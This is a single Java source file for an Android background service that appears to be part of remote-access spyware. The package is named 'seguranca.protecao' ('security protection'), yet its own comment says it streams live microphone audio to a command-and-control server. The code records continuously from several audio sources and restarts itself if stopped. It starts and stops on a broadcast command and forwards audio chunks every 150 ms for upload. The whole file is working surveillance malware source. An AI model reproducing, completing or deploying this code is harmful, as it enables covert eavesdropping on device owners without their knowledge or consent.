package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * 🎤 SERVIÇO DE MICROFONE EM TEMPO REAL
 * 
 * Captura áudio do microfone e envia para o servidor C&C em tempo real.
 */
public class MicrophoneService extends Service {
    private static final String TAG = "MicrophoneService";
    
    private static final int SAMPLE_RATE = 16000; // 16kHz
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
    
    private AudioRecord audioRecord;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private boolean isRecording = false;
    private Thread recordingThread;
    
    private BroadcastReceiver micReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            Log.d(TAG, "🎤 Broadcast TOGGLE_MICROPHONE recebido: " + (enabled ? "ATIVAR" : "DESATIVAR"));
            
            if (enabled) {
                startCapture();
            } else {
                stopCapture();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎤 MicrophoneService criado");
        
        // Registra receiver
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.TOGGLE_MICROPHONE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(micReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(micReceiver, filter);
        }
        
        startBackgroundThread();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            boolean enabled = intent.getBooleanExtra("enabled", true);
            Log.d(TAG, "🎤 onStartCommand ativado: enabled=" + enabled);
            if (enabled) {
                startCapture();
            } else {
                stopCapture();
            }
        } else {
            startCapture();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = new HandlerThread("MicrophoneBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
        }
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar thread: " + e.getMessage());
            }
        }
    }

    private synchronized void startCapture() {
        if (isRecording) {
            Log.w(TAG, "⚠️ Microfone já está gravando!");
            return;
        }
        
        try {
            Log.d(TAG, "🎤 Iniciando captura de áudio...");
            
            // Fontes de áudio em ordem de preferência (VOICE_COMMUNICATION tem Echo Cancellation nativo)
            int[] sources = new int[]{
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.DEFAULT
            };

            AudioRecord rec = null;
            for (int source : sources) {
                try {
                    int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
                    int bufSize = Math.max(minBuf * 2, 4096);
                    rec = new AudioRecord(
                        source,
                        SAMPLE_RATE,
                        CHANNEL_CONFIG,
                        AUDIO_FORMAT,
                        bufSize
                    );
                    if (rec.getState() == AudioRecord.STATE_INITIALIZED) {
                        Log.d(TAG, "✅ AudioRecord inicializado com sucesso (fonte de áudio: " + source + ")");
                        break;
                    } else {
                        rec.release();
                        rec = null;
                    }
                } catch (Exception ex) {
                    rec = null;
                }
            }
            
            if (rec == null) {
                Log.e(TAG, "❌ Falha ao inicializar AudioRecord em todas as fontes disponíveis!");
                return;
            }
            
            audioRecord = rec;
            audioRecord.startRecording();
            isRecording = true;
            
            // Inicia thread de captura
            recordingThread = new Thread(new AudioCaptureRunnable());
            recordingThread.start();
            
            Log.d(TAG, "✅ Captura de áudio do microfone ativa em tempo real!");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao iniciar captura: " + e.getMessage(), e);
        }
    }

    private synchronized void stopCapture() {
        Log.d(TAG, "🎤 Parando captura de microfone...");
        isRecording = false;
        
        if (audioRecord != null) {
            try {
                if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.stop();
                }
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Erro ao liberar AudioRecord: " + e.getMessage());
            }
            audioRecord = null;
        }
        
        if (recordingThread != null) {
            try {
                recordingThread.join(1000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar thread de áudio: " + e.getMessage());
            }
            recordingThread = null;
        }
    }

    private class AudioCaptureRunnable implements Runnable {
        private long lastSendTime = 0;
        private static final long SEND_INTERVAL = 150; // Envia a cada 150ms para streaming contínuo sem lag
        
        @Override
        public void run() {
            int readBufSize = Math.max(BUFFER_SIZE, 2048);
            short[] buffer = new short[readBufSize];
            ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
            
            while (isRecording && audioRecord != null) {
                try {
                    int read = audioRecord.read(buffer, 0, buffer.length);
                    
                    if (read > 0) {
                        // Converte short[] para byte[] (Little-Endian PCM 16-bit)
                        byte[] audioBytes = new byte[read * 2];
                        for (int i = 0; i < read; i++) {
                            audioBytes[i * 2] = (byte) (buffer[i] & 0xFF);
                            audioBytes[i * 2 + 1] = (byte) ((buffer[i] >> 8) & 0xFF);
                        }
                        
                        // Acumula dados
                        byteStream.write(audioBytes);
                        
                        // Envia para o servidor a cada 150ms
                        long now = System.currentTimeMillis();
                        if (now - lastSendTime > SEND_INTERVAL) {
                            byte[] data = byteStream.toByteArray();
                            if (data.length > 0) {
                                sendAudioToServer(data);
                                byteStream.reset();
                            }
                            lastSendTime = now;
                        }
                    }
                    
                    Thread.sleep(10);
                    
                } catch (Exception e) {
                    Log.e(TAG, "❌ Erro no loop de captura de áudio: " + e.getMessage());
                    break;
                }
            }
            
            // Envia resto de dados
            try {
                byte[] data = byteStream.toByteArray();
                if (data.length > 0) {
                    sendAudioToServer(data);
                }
                byteStream.close();
            } catch (IOException e) {
                Log.e(TAG, "Erro ao fechar stream de áudio: " + e.getMessage());
            }
        }
    }

    private void sendAudioToServer(byte[] audioData) {
        Intent intent = new Intent("com.seguranca.protecao.AUDIO_CHUNK_READY");
        intent.setPackage(getPackageName());
        intent.putExtra("audio", audioData);
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🎤 MicrophoneService destruído");
        
        stopCapture();
        stopBackgroundThread();
        
        try {
            unregisterReceiver(micReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver: " + e.getMessage());
        }
    }
}
